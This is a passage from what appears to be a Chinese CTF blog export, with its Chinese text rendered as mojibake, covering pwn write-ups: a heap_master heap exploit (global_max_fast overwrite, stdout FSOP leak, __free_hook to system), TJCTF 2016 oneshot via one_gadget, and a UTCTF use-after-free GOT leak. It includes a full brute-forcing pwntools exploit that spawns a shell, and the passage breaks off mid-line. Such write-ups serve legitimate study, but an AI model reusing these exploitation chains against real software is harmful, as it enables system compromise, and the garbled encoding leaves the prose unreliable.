†åœ°å€ï¼Œä»è€Œæ³„éœ²å‡ºmain_arenaåœ°å€å¾—åˆ°åœ°å€ã€‚\n\n(3)å†åˆ©ç”¨fastbinçš„ç‰¹æ€§ï¼Œä¿®æ”¹fastbinYæ•°ç»„ä¸Šçš„chunkçš„fdä¸ºsystemï¼Œç”³è¯·å¯¹åº”å¤§å°çš„fastbinå›æ¥ä¹‹åï¼Œå…¶fdå°±ç•™åœ¨fastbinYæ•°ç»„ä¸Šï¼Œè¿™æ ·å¦‚æœfastbinYå¯¹åº”çš„é‚£ä¸ªç´¢å¼•chunkæœ¬èº«å°±åœ¨free_hookä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹free_hookä¸ºsystemäº†ã€‚è¿™ä¸ªåŒæ ·é€šè¿‡fastbinYæ•°ç»„è¶Šç•Œå†™æ¥å®ç°ã€‚\n\n(4)æœ€åé‡Šæ”¾ä¸€ä¸ª/bin/shå †å—å³å¯getshellã€‚\n\n# 4.expç¼–å†™ä¸è°ƒè¯•ï¼š\n\n(1)é¦–å…ˆæ˜¯èœå•å‡½æ•°ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n```\n\nè¿™é‡Œåˆ‡åˆ†m_deleteå’Œm_editçš„åŸå› æ˜¯å› ä¸ºåœ¨åé¢ç¬¬ä¸€æ¬¡ä¿®æ”¹_IO_write_baseä¹‹åè¾“å‡ºçš„ä¸œè¥¿å¯èƒ½å°±ä¼šå‘ç”Ÿä¸€äº›å˜åŒ–ï¼Œä¸å¤ªå¥½æ¥ç€åˆ¤æ–­ã€‚\n\n(2)ä¿®æ”¹global_max_fastï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nedit(0,p64(0x0)+p64(0x91)+\n    '0'*0x80+\n    p64(0x0)+p64(0x21)+\n    '1'*0x10+\n    p64(0x0)+p64(0x21))\ndelete(0x10)\nguess = 0x9000\nedit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10) & 0xffff))\nadd(0x80)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-40-07.png)\n\n(3)fastbinYæ•°ç»„è¶Šç•Œå†™ï¼Œæ³„éœ²å¾—åˆ°åœ°å€ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nfastbinsY = guess + libc.sym['main_arena'] + 8\n_IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n_IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n_IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n_IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\n\n# overwrite _IO_2_1_stdout_._IO_write_base\nidx = (_IO_write_base - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_ptr\nidx = (_IO_write_ptr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_end\nidx = (_IO_write_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_read_end\nidx = (_IO_read_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\nlibc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\nlog.info(\"libc_base:0x%x\"%libc_base)\n__free_hook = libc_base + libc.sym['__free_hook'] \nfastbinsY = libc_base + libc.sym['main_arena'] + 8 \nsystem_addr = libc_base + libc.sym['system']\n```\n\nmmapä¸º0x4a0fe000\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-03-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-32.png)\n\nå››ä¸ªå‡ä¿®æ”¹è¿‡äº†ï¼Œè¿™ç§æƒ…å†µä¸‹flagä¸ä¿®æ”¹ä¹Ÿæ˜¯å¯ä»¥æ³„éœ²çš„ã€‚\n\nâ–²å…¶å®è¿™ä¸ªåªå†™write_baseå’Œread_endä¹Ÿå¯ä»¥ï¼Œåªä¸è¿‡ä¼šå‘é€ç‰¹åˆ«å¤šçš„æ•°æ®è¿‡æ¥ï¼Œæ‰“è¿œç¨‹çš„æ—¶å€™å¾ˆä¸å¥½æ‰“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯read_endå¾—æœ€åå†™ã€‚\n\n(4)è¶Šç•Œé‡Šæ”¾chunkåˆ°_free_hookï¼Œç„¶åä¿®æ”¹å…¶fdä¸ºsystemï¼Œå†ç”³è¯·å›æ¥å°±å¯ä»¥å°†_free_hookæ”¹ä¸ºsystemã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\n# fake fastbin fd to system\nidx = (__free_hook - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nlog.info(\"size:0x%x\"%size)\nedit(0x10 + 8, p64(size+1))\nedit(0x10 + size, p64(0x0)+p64(0x21))\ndelete(0x10 + 0x10)\nedit(0x20, p64(system_addr))\nadd(size - 0x10)\n```\n\næ²¡æœ‰ç”³è¯·å›æ¥ä¹‹å‰ï¼Œfree_hookä¸Šæ˜¯å †åœ°å€ï¼Œå…¶FDä¸ºsystem\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-3.png)\n\nç”³è¯·å›æ¥ä¹‹åï¼ŒFDè¢«å†™è¿›free_hookï¼Œè¿™æ˜¯fastbinæœºåˆ¶é€ æˆçš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-3.png)\n\n(5)åˆ›å»º/bin/shå †å—ï¼Œé‡Šæ”¾å³å¯getshellï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nedit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\ndelete(0x200 + 0x10)\nio.interactive()\n```\n\n# 5.æ€»çš„çˆ†ç ´EXPï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\nfrom time import sleep\nimport os\ncontext.binary = \"./heap_master\"\nlibc = ELF(context.binary.libc.path)\n\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n\ndef pwn():\n    global io\n    edit(0,p64(0x0)+p64(0x91)+\n        '0'*0x80+\n        p64(0x0)+p64(0x21)+\n        '1'*0x10+\n        p64(0x0)+p64(0x21))\n    delete(0x10)\n    guess = 0x9000\n    edit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10)&0xffff))\n    add(0x80)\n\n\n    fastbinsY = guess + libc.sym['main_arena'] + 8\n    _IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n    _IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n    _IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n    _IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n    __free_hook = guess + libc.sym['__free_hook']\n    _IO_list_all = guess + libc.sym['_IO_list_all']\n\n    # overwrite _IO_2_1_stdout_._IO_write_base\n    idx = (_IO_write_base - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_write_ptr\n    idx = (_IO_write_ptr - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n    # overwrite _IO_2_1_stdout_._IO_write_end\n    idx = (_IO_write_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_read_end\n    idx = (_IO_read_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n    libc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\n    log.info(\"libc_base:0x%x\"%libc_base)\n    __free_hook = libc_base + libc.sym['__free_hook']\n    fastbinsY = libc_base + libc.sym['main_arena'] + 8\n    system_addr = libc_base + libc.sym['system']\n\n\n    # fake fastbin fd to system\n    idx = (__free_hook - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    log.info(\"size:0x%x\"%size)\n    edit(0x10 + 8, p64(size+1))\n    edit(0x10 + size, p64(0x0)+p64(0x21))\n    delete(0x10 + 0x10)\n    edit(0x20, p64(system_addr))\n    #dbg()\n    add(size - 0x10)\n    #pause()\n\n    edit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\n    delete(0x200 + 0x10)\n\n    io.interactive()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io = process(\"./heap_master\")\n    try:\n        pwn()\n        io.recv(timeout = 1) \n        #è¦ä¹ˆå´©æºƒè¦ä¹ˆçˆ†ç ´æˆåŠŸï¼Œè‹¥å´©æºƒioä¼šå…³é—­ï¼Œio.recv()ä¼šè§¦å‘   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        # sleep(0.1)\n        # io.sendline('/bin/sh\\x00')\n        # sleep(0.1)\n        # io.interactive() #æ²¡æœ‰EOFErrorçš„è¯å°±æ˜¯çˆ†ç ´æˆåŠŸï¼Œå¯ä»¥å¼€shell\n        break\n```\n\n# 6.æ€»ç»“ï¼š\n\n(1)unsortedbin attackï¼šä¿®æ”¹bkä»»æ„å†™main_arenaï¼Œè¿™é‡Œbké€šå¸¸å¯ä»¥è¿›è¡Œéƒ¨åˆ†å†™æ¥çˆ†ç ´ï¼Œä¹Ÿå¸¸å¸¸ç”¨æ¥ä¿®æ”¹global_max_fastï¼Œä½¿å¾—fastbinYè¶Šç•Œå†™ã€‚\n\n(2)FSOPçš„åˆ©ç”¨ä¸­ï¼Œä¸ä¸€å®šéå¾—ä¿®æ”¹flagï¼Œä¿®æ”¹_IO_write_baseã€_IO_write_ptrã€_IO_read_endã€_IO_write_endä¹Ÿå¯ä»¥ï¼Œå…¶ä¸­éœ€è¦æ»¡è¶³_IO_read_endç­‰äº_IO_write_baseæ¥èµ·åˆ°flagçš„ä½œç”¨ç»•è¿‡æ£€æŸ¥ã€‚\n\n(3)fastbinYæ•°ç»„çš„è¶Šç•Œç”³è¯·ï¼Œä¿®æ”¹å…¶fdå¯å®ç°ä»»æ„å†™ï¼Œè¿™ç‚¹å’Œåˆ©ç”¨fastbinYæ•°ç»„ä¸­chunkå¤§å°åœ¨main_arenaä¸­ç•™ä¸‹0x20~0x80çš„æ•°æ®å¼‚æ›²åŒå·¥ã€‚","tags":["Heap-Skill"],"categories":["PWN","pwnå †-åˆ·é¢˜æŠ€å·§"]},{"title":"TJCTF 2016-oneshot","url":"/2021/08/14/TJCTF 2016-oneshot/","content":"\n \n\n1.å¸¸è§„checksecï¼Œåªå¼€äº†NXï¼Œç„¶åIDAæ‰“å¼€æ‰¾æ¼æ´ã€‚å‘ç°æ‰¾ä¸åˆ°ä»€ä¹ˆæ¼æ´ï¼Œä½†æ˜¯æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„åœ°æ–¹\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]\n---------------------------------------------------------------------------\n__isoc99_scanf(\"%ld\", &v4);\n-------------------------------------------------------------------------\nreturn v4(\"Good luck!\");\n```\n\næŸ¥çœ‹åæ±‡ç¼–ä»£ç åå‘ç°ä¼šæœ‰è¿™ä¹ˆä¸€ä¸²ä»£ç ï¼Œv4æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿ï¼Œå´è¢«ä»¥å‡½æ•°å½¢å¼è°ƒç”¨ã€‚åœ¨æ±‡ç¼–çª—å£ä¸­çœ‹ä¸‹ï¼Œå‘ç°call putså‡½æ•°ä¹‹åçš„ä»£ç å½¢å¼æ˜¯è¿™æ ·çš„ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nvar_8 = qword ptr -8\n--------------------------------------------------------\nmov  rax, [rbp+var_8]\nmov  rdx, rax\nmov  eax, 0\ncall rdx\n```\n\nä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„ä¿å­˜åœ¨var_8é‡Œçš„å†…å®¹ï¼Œç»™äº†rax,raxåˆç»™äº†rdxï¼Œä¹‹åcall rdxã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿æœ€åä¼šè¢«å½“åˆä»£ç æŒ‡ä»¤æ¥æ‰§è¡Œã€‚\n\n2.ç¨‹åºä¸å­˜åœ¨æ ˆæº¢å‡ºï¼Œè¾“å…¥åªèƒ½æ˜¯4ä¸ªå­—èŠ‚ï¼Œå·²ç»è§„å®šå¥½äº†ã€‚%ldä»£è¡¨long intï¼Œå››ä¸ªå­—èŠ‚ï¼Œç¨‹åºåˆæ²¡æœ‰ä¸€æ¬¡getshellçš„åé—¨å‡½æ•°ï¼Œæ‰€ä»¥å°±åªèƒ½é è¿™4ä¸ªå­—èŠ‚æ¥getshellã€‚\n\n3.è¿™é‡Œè€ƒè™‘ä½¿ç”¨one gadget RCEæ¥ä¸€æ­¥getshellï¼Œé¦–å…ˆåœ¨Linuxä¸‹æŸ¥æ‰¾ä¸€ä¸‹é¢˜ç›®ç»™çš„libcä¸­æœ‰æ²¡æœ‰onegadget:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550001.jpeg)\n\n4.è¿™æ ·å°±å¯ä»¥é€šè¿‡ä¸€æ¬¡è·³è½¬æ¥getshellï¼Œä½†æ˜¯ç¬¬ä¸€æ¡æœ‰é™åˆ¶æ¡ä»¶ï¼Œç”±äºæ±‡ç¼–ä»£ç ä¸­åœ¨call rdxä¹‹å‰æœ‰mov eax,0;å³raxå°±ç­‰äº0ã€‚(eaxåœ¨64ä½ç¨‹åºä¸‹å°±æ˜¯raxçš„ä½32ä½)æˆ–è€…å…ˆè°ƒè¯•çœ‹çœ‹èƒ½ä¸èƒ½æ»¡è¶³æ¡ä»¶ï¼Œç»è¿‡è°ƒè¯•å‘ç°æ‰§è¡Œåˆ°call rdxæ—¶rax = 0ï¼Œä¹Ÿæ»¡è¶³è¦æ±‚ï¼Œé‚£ä¹ˆå°±å°è¯•å†™payloadã€‚\n\n5.æœ¬åœ°ä¸­é¦–å…ˆéœ€è¦è¿æ¥åˆ°æŒ‡å®šçš„åº“æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å…ˆåœ¨linuxä¸­ldd libcåº“æ–‡ä»¶æ¥çœ‹é¢˜ç›®ç»™çš„åº“æ–‡ä»¶æ˜¯ä»€ä¹ˆç‰ˆæœ¬ï¼Œä¹‹åä¿®æ”¹è¿™æ®µä»£ç è®©processèƒ½å¤Ÿè¿æ¥åˆ°æŒ‡å®šç‰ˆæœ¬çš„libcæ–‡ä»¶ã€‚(åˆ©ç”¨pwndockerï¼Œæˆ–è€…è‡ªå·±ä¸‹ä¸ªå¯¹åº”ç‰ˆæœ¬çš„ubuntuâ€”dockerï¼Œç„¶åå®‰è£…pythonä¹‹ç±»çš„)\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n\n6.ç”±äºä¸çŸ¥é“onegadgetè¢«libcåŠ è½½è¿›å…¥ä¹‹åæ˜¯åœ¨ä»€ä¹ˆåœ°å€ï¼Œæ‰€ä»¥ç°åœ¨è¿˜éœ€è¦æ³„éœ²ä¸€ä¸ªåœ°å€ï¼Œåˆšå¥½ç¨‹åºä¸­æœ‰ä¸¤ä¸ªisoc99_scanfï¼Œç¬¬ä¸€ä¸ªå¯ä»¥ç”¨æ¥è¾“å…¥æŸä¸ªå‡½æ•°.gotè¡¨ä¸­onegadgetçš„åœ°å€ï¼Œç„¶åç¨‹åºä¼šæ‰“å°å‡ºæ¥è¯¥å‡½æ•°çœŸå®åœ°å€ï¼Œå¯¹åº”ä»£ç ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__isoc99_scanf(\"%ld\", &v4);\nprintf(\"Value: 0x%016lx\\n\", *(_QWORD *)v4);\n```\n\nä½†æ³¨æ„è¾“å…¥çš„æ ¼å¼ã€‚ç”±äºè¾“å…¥æ ¼å¼ä¸º__isoc99_scanf(\"%ld\", &v4)ä¸­çš„ldï¼Œä¹Ÿå°±æ˜¯åè¿›åˆ¶æœ‰ç¬¦å·é•¿æ•´å‹ï¼Œ(l=longå‹ï¼Œd=Decimalä¹Ÿå°±æ˜¯åè¿›åˆ¶)æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†è¯¥åœ°å€è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°ç„¶åè¾“å…¥ï¼Œå› ä¸ºscanfæ ¼å¼è§„å®šäº†ï¼Œä¹‹åæ‰“å°çš„æ ¼å¼æ˜¯%016lxï¼Œå…¶ä¸­xä»£è¡¨Hexadecimalï¼Œä¹Ÿå°±æ˜¯16è¿›åˆ¶ï¼Œ16ä»£è¡¨æ€»å…±è¾“å‡º16ä½ï¼Œ0ä»£è¡¨ä¸è¶³16ä½åˆ™é«˜ä½è¡¥é›¶ã€‚(å¦‚æœä¸çŸ¥é“å¯ä»¥æ‹¿visualstudioæµ‹è¯•ä¸€ä¸‹å°±å¯ä»¥)\n\n7.æ‰€ä»¥ç¬¬ä¸€æ¬¡è¾“å…¥åº”è¯¥ä¸ºæŸä¸ªå‡½æ•°åœ°å€å¯¹åº”çš„åè¿›åˆ¶ï¼Œè¿™é‡Œé€‰å–setbufå‡½æ•°ï¼Œå› ä¸ºsetbufå‡½æ•°åˆšå¥½åœ¨.got.pltè¡¨ä¸­ï¼ŒåŒæ—¶ä¹Ÿä»å¤–éƒ¨å¼•ç”¨ï¼Œåœ¨externä¹Ÿæœ‰ï¼Œåå…­è¿›åˆ¶åœ°å€ä¸ºï¼š0x600ae0(è¿™é‡Œé€‰ç”¨puts,printf,ç”šè‡³__libc_start_mainä¹Ÿè¡Œï¼Œåªè¦æ»¡è¶³åœ¨.got.pltè¡¨ä¸­å’Œexternè¡¨ä¸­)ä¹Ÿå°±æ˜¯6294240ï¼Œå³io.sendline(â€œ6294240â€)ã€‚è¿™æ ·å°±å¯ä»¥æ‰“å°å‡ºsetbufå‡½æ•°è¢«åŠ è½½è¿›å†…å­˜çš„åœ°å€ï¼Œä¹‹åè·å–è¿™ä¸ªåœ°å€ï¼Œå…ˆæ¥æ”¶io.recvuntil(\"Value: \")ï¼Œä½¿å¾—æ¥ä¸‹æ¥æ‰“å°çš„æ˜¯setbufçš„å†…å­˜åœ°å€ï¼Œä¹‹åä½¿ç”¨\n\nsetbuf_memory_addr = int(io.recv()[:18], 16)\n\nè¡¨ç¤ºæ€»å…±æ¥æ”¶18ä¸ªå­—ç¬¦ï¼Œä¹‹åä»¥16è¿›åˆ¶å½¢å¼è½¬åŒ–ä½intï¼Œ10è¿›åˆ¶å½¢å¼ã€‚è¿™é‡Œæ€»å…±åº”è¯¥ä¼šæ‰“å°18ä¸ªå­—ç¬¦ï¼Œ16+0xï¼Œä¹Ÿå°±æ˜¯18ä¸ªã€‚\n\n8.ä¹‹åè®¡ç®—åç§»é‡ï¼Œå¾—åˆ°one_gadget_rceåœ¨å†…å­˜ä¸­çš„åœ°å€å³å¯ï¼šæ³¨æ„è¦è½¬åŒ–ä¸ºstrå­—ä¸²å½¢å¼å‘é€\n\nio.sendline(str(setbuf_memory_addr - (setbuf_addr_libc - one_gadget_rce_libc)))\n\n9.æœ€åio.interactive()å³å¯getshellã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"UTCTFèµ›åå¤ç°","url":"/2021/08/14/UTCTFèµ›åå¤ç°/","content":"\nè¿™æ¬¡æ¯”èµ›åšäº†ä¸¤é“é¢˜ä¹‹åå°±æ²¡æ€ä¹ˆçœ‹äº†ï¼Œå¿™å…¶ä»–çš„å»äº†ã€‚è¿™é‡Œä¸»è¦å¤ç°ä¸€ä¸‹å¦ä¸€é“é¢˜ï¼Œmonkeã€‚åšè¿™é“é¢˜çš„æ—¶å€™ä¼°è®¡è„‘å­æŠ½é£äº†ï¼Œå±…ç„¶æ²¡çœ‹è¿˜æœ‰ä¸€ä¸ªéšè—é€‰é¡¹åœ¨IDAä¸­æ˜æ˜ç™½ç™½åœ°æ˜¾ç¤ºç€ï¼Œè‡ªå·±å±…ç„¶æ²¡å‘ç°ï¼Œå¯¼è‡´å•¥æ¼æ´éƒ½æ‰¾ä¸å‡ºæ¥ã€‚\n\nä¸€ã€MONKEå¤ç°ï¼š\n\n1.å¸¸è§„IDAï¼Œchecksecä¸€ä¸‹ï¼Œåªå¼€äº†NXã€‚æ¼æ´ç‚¹åœ¨Freeæ¨¡å—å’Œéšè—é€‰é¡¹ï¼š\n\nFreeæ¨¡å—\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457777.png)\n\néšè—é€‰é¡¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457778.png)\n\nå¯ä»¥çœ‹åˆ°å½“freeçš„æ—¶å€™ï¼Œä¼šå¯¹can_eatè¿™ä¸ªå…¨å±€å˜é‡è¿›è¡Œåˆ¤æ–­ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n\ncan_eaté»˜è®¤ä¸º1\n------------------------------------------------------------------------------\nif ( can_eat )\n    inventory[edit_idx] = 0LL;\n```\n\nå¦‚æœä¸º1ï¼Œåˆ™å°†æŒ‡é’ˆç½®é›¶ï¼Œå¦åˆ™å°±ä¸ç½®é›¶ã€‚è¿™æ ·å°±ä¼šé€ æˆç®¡ç†bananaçš„inventory[idx]æŒ‡é’ˆæ‚¬ç©ºï¼Œå†åŠ ä¸Šé€‰é¡¹2å¯ä»¥renameä¿®æ”¹å†…å®¹ï¼Œç›´æ¥é€ æˆUAFæ¼æ´ã€‚åŒæ—¶ï¼Œç”±äºè¿™é‡Œæ˜¯é€šè¿‡ç»“æ„ä½“inventoryæ¥ç®¡ç†bananaï¼Œç»“æ„ä½“å¦‚ä¸‹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n00000000 inventory struc ; (sizeof=0x10, mappedto_4)\n00000000 banana dq ?\n00000008 name_size dq ?\n00000010 inventory ends\n```\n\næ‰“å°å†…å®¹çš„æ—¶å€™æ˜¯é€šè¿‡inventory[idx]->bananaæ¥æ‰“å°çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠbananaçš„æŒ‡é’ˆæŒ‡å‘gotè¡¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰“å°å‡ºgotè¡¨ä¸­å‡½æ•°çš„çœŸå®åœ°å€ï¼Œä»è€Œæ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œè¿™æ ·é€šè¿‡libcåŸºåœ°å€å’ŒUAFæ¼æ´ç›´æ¥åŠ«æŒfreeå‡½æ•°ï¼Œæ„é€ system(\"/bin/sh\")å³å¯ã€‚\n\nâ–²æ€è€ƒå¦‚ä½•å°†bananaæŒ‡é’ˆæŒ‡å‘gotè¡¨ï¼šæ¼æ´ç‚¹åŒæ ·ä¹Ÿåœ¨freeå‡½æ•°ï¼Œç”±äºåœ¨mallocæ—¶ä¼šç”³è¯·ä¸€ä¸ª0x20å¤§å°çš„chunkæ¥å­˜æ”¾bananaçš„åœ°å€å’Œsizeï¼Œç”¨æ¥ç®¡ç†bananaã€‚ä½†æ˜¯åœ¨freeçš„æ—¶å€™å´æ²¡æœ‰freeæ‰è¿™ä¸ª0x20å¤§å°çš„chunkã€‚\n\n(1)å…ˆç”³è¯·ä¸€ä¸ª0x20å¤§å°çš„banana0ï¼Œè¿›å…¥éšè—é€‰é¡¹ï¼Œç„¶åfreeæ‰ï¼Œbanana0è¿›å…¥tcacheä¸­ï¼Œä½†æ˜¯inventory[0]å¹¶æ²¡æœ‰è¢«ç½®0ã€‚\n\n(2)å†ç”³è¯·ä¸€ä¸ª0x20å¤§å°çš„banana1ï¼Œå°†banan0ç”³è¯·å›æ¥ï¼Œè¿™æ—¶ç®¡ç†banana1çš„chunkå°±å˜æˆäº†banan0ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡inventory[0]æ¥ä¿®æ”¹banan0ä»è€Œä¿®æ”¹ç®¡ç†banan1çš„chunkï¼Œä½¿å¾—åŸæœ¬æŒ‡å‘banan1çš„æŒ‡é’ˆæŒ‡å‘freeçš„gotè¡¨ã€‚\n\n(3)ä¹‹åå†é€šè¿‡é€‰é¡¹2ï¼Œå°±å¯ä»¥æ‰“å°inventory[0].banana1çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯freeçš„gotè¡¨ä¸­çš„çœŸå®åœ°å€ã€‚\n\n2.å¼€å§‹ç¼–å†™exp:\n\n(1)é¦–å…ˆæ³„éœ²åŸºåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfind_banana(\"a\", 4)\n\n#è·³è½¬è‡³éšè—é€‰é¡¹ï¼Œå°†can_eatç½®é›¶ã€‚\nwalk(\"0\")\n\n#åƒæ‰é¦™è•‰ï¼Œä½¿å¾—banana0è¿›å…¥tcacheä¸­ï¼Œæ–¹ä¾¿ä¹‹åç”³è¯·å›æ¥ï¼ŒåŒæ—¶inventory[0]æ²¡æœ‰ç½®é›¶ã€‚\neat(0)\n\n#ç”³è¯·banana1ï¼Œå°†banana0ç”³è¯·å›æ¥ï¼Œä½¿å¾—ç®¡ç†banana1çš„chunkå˜æˆbanana0ï¼Œæ–¹ä¾¿ä¹‹åä¿®æ”¹ã€‚\nfind_banana(\"b\", 8)\n\n#å°†*(inventory[0].banana)ä¿®æ”¹ä¸ºfreeçš„gotè¡¨\nrename(0, p64(elf.got[\"free\"]))\nsh.sendline(\"s\")\nskip_menu()\n\n# å±•ç¤ºinventoryï¼Œä»inventory[0].bananaå¯¹åº”çš„å†…å­˜ä¸Šæ³„éœ²åœ°å€\nsh.sendline(\"2\")\nsh.recvline()\nsh.recvline()\nfree = u64(sh.recvline()[3:].strip().ljust(8, b\"\\x00\"))\n\n#è®¡ç®—å¾—åˆ°libcåŸºåœ°å€ï¼š\nlibc.address = free - libc.symbols[\"free\"]\nlog.info(f\"libc base leaked @ 